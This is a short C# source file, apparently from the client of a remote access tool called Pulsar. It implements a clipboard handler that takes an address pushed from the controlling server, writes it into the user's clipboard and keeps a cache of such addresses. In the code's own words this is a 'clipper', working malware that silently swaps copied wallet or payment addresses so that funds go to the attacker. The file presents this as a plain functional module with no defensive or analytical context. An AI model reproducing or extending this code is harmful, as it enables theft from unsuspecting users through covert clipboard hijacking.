using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Monitoring.Clipboard;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Messages.UserSupport.MessageBox;
using Pulsar.Common.Networking;
using System;
using System.Threading;
using System.Windows.Forms;
using System.Collections.Generic;


namespace Pulsar.Client.Messages
{
    public class ClipboardHandler : IMessageProcessor
    {
        // Do not use this for changing addresses, the clipper address might have changed (or the clipper may be off altogether).
        public static List<string> _cachedAddresses = new List<string>(); 

        public bool CanExecute(IMessage message) => message is DoSendAddress;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoSendAddress msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, DoSendAddress message)
        {
            Thread clipboardThread = new Thread(() =>
            {
                Thread.CurrentThread.SetApartmentState(ApartmentState.STA);
                string clipperAddress = message.Address;
                _cachedAddresses.Add(clipperAddress);
                Clipboard.SetText(clipperAddress);
                Application.DoEvents();
            })
            { IsBackground = true };
            clipboardThread.SetApartmentState(ApartmentState.STA); 
            clipboardThread.Start();
            clipboardThread.Join();
        }
    }
}
